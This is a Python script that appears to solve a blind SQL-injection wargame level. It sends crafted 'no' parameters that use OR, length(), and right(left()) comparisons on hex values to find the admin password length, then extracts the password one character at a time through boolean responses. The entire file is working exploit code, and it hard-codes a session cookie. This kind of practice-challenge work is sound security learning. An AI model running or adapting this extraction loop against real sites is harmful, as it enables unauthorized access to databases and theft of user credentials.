import requests
import string

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookie = {'PHPSESSID': 'jett8kmnsi97cl8bu5naomvbdm'}

def pw_len():
    for pw_length in range(50):
        param = {"pw":"-1","no":"-1||no>1&&length(pw)>{}#".format(pw_length)}
        req = requests.get(url, params=param, cookies=cookie)

        if "Hello admin" not in req.text:
            print("length:", pw_length)
            return pw_length

def pw_find():
    length = int(pw_len())
    password = ""
    for i in range(length):
        for value in range(33,127):
            if hex(value) == "0x25":
                continue
            param = {"pw":"-1","no":"-1||no>1&&right(left(pw,{}),1) in({})#".format(i+1, hex(value))}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
    print("Password:", password)

pw_find()